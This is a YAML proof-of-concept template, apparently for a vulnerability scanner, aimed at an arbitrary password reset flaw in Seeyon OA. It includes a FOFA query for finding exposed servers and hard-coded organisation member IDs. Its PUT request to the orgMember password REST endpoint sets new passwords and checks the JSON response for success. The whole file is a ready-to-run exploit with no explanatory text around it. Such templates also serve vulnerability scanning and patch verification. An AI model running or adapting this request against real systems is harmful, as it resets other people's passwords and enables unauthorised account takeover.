id: poc-yaml-seeyon-oa-ucpclogin-reset-password
info:
  name: 致远OA ucpclogin 任意密码重置漏洞
  severity: critical
  tags:
  - 两高一弱
  - 资源管理错误
  finger: 致远OA
  fofa: app="致远互联-OA" && is_domain=false
variables:
  passwd: 'share.do

    genericController.do

    '
  id: '5725175934914479521L

    -4401606663639775639

    '
requests:
- method: PUT
  path: /seeyon/rest/orgMember/{{.id}}/password/{{.passwd}}
  expression: "status_code == 200 && \ncontains(body,\"SUCCESS\") &&\ncontains(body,\"\
    \\\"enabled\\\":true\") &&\ncontains(body,\"\\\"isDeleted\\\":false\") &&\ncontains(body,\"\
    \\\"orgAccountId\\\"\") &&\ncontains(content_type,\"application/json\")\n"
transport: http
